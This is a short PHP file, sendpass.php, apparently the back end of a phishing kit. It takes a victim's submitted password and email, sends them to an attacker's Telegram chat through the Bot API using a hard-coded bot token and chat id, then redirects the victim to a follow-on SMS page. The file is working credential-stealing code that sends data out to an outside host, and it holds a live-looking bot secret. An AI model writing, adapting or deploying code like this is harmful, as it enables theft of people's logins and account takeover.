<?php
// sendpass.php

// It's good practice to display errors during development
ini_set('display_errors', 1);
error_reporting(E_ALL);

// --- Your Bot Details ---
$bot_token = '8166415338:AAEd3Dpp4f_Yup_qtiIm7y4pw2HDATA_ZuA';
$chat_id = '-4625302890';

// --- Get data from the form ---
// Use htmlspecialchars to prevent XSS issues
$password = isset($_POST['password']) ? htmlspecialchars($_POST['password']) : '';
$email = isset($_GET['email']) ? htmlspecialchars($_GET['email']) : 'unknown';

// --- Check if a password was actually submitted ---
if (!empty($password)) {
    // --- Prepare the message for Telegram ---
    $message = "<b>🔐 Password Received</b>\n\n";
    $message .= "<b>Email:</b> " . $email . "\n";
    $message .= "<b>Password:</b> " . $password;

    $url = "https://api.telegram.org/bot$bot_token/sendMessage";
    
    // Data to be sent to the Telegram API
    $post_fields = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML' // Use HTML for bold tags
    ];

    // --- START OF cURL IMPLEMENTATION ---

    // 1. Initialize a cURL session
    $ch = curl_init();

    // 2. Set the URL and other options
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true); // We are sending a POST request
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_fields)); // The data to post
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // Return the response instead of printing it
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Optional: can help on some servers

    // 3. Execute the request
    $response = curl_exec($ch);

    // 4. Close the cURL session
    curl_close($ch);
    
    // --- END OF cURL IMPLEMENTATION ---
}

// --- Redirect the user after submission ---
// This happens whether a password was sent or not
header('Location: ../sms.php');
exit;
?>
